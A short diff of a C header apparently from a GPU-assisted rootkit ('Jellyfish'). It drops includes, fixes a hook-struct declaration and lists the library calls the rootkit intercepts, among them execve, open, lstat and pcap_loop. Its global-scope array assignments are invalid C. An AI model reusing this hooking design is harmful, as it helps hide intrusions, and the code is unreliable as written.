@@ -14,39 +14,8 @@ GNU General Public License for more details.
  
 */
 
-#define _GNU_SOURCE
-
 #ifndef __KIT_H__
 #define __KIT_H__
-
-#include <stdio.h>
-#include <dlfcn.h>
-#include <dirent.h>
-#include <string.h>
-#include <stdlib.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
-#include <limits.h>
-#include <errno.h>
-#include <unistd.h>
-#include <arpa/inet.h>
-#include <netinet/tcp.h>
-#include <netinet/in.h>
-#include <netdb.h>
-#include <sys/ioctl.h>
-#include <termios.h>
-#include <pty.h>
-#include <signal.h>
-#include <utmp.h>
-#include <dirent.h>
-
-// will add multi-os compatibility soon
-#if defined (__APPLE__) || defined(MACOSX) || defined(OSX)
-    #include <OpenCL/opencl.h>
-#else
-    #include <CL/opencl.h>
-#endif
 
 #define __JELLYFISH__ "kit.cl"
 #define __JELLYXOR__ "xor.cl"
@@ -79,12 +48,13 @@ GNU General Public License for more details.
 #define SYSCALL_SIZE 8
 
 typedef struct sys_calls{
+    char name[50];
     void *(*syscall_func)();
-}; s_calls;
+} s_calls;
 
 s_calls syscall[SYSCALL_SIZE];
 
-const char syscall_table[SYSCALL_SIZE];
+const char *syscall_table[SYSCALL_SIZE];
 syscall_table[0] = "fopen";
 syscall_table[1] = "mkdir";
 syscall_table[2] = "lstat";
@@ -93,7 +63,6 @@ syscall_table[4] = "creat";
 syscall_table[5] = "execve";
 syscall_table[6] = "open";
 syscall_table[7] = "pcap_loop";
-syscall_table[8] = "SYSCALL_SIZE";
 
 // hidden gpu functions
 cl_device_id create_device(void) __attribute__((visibility("hidden")));
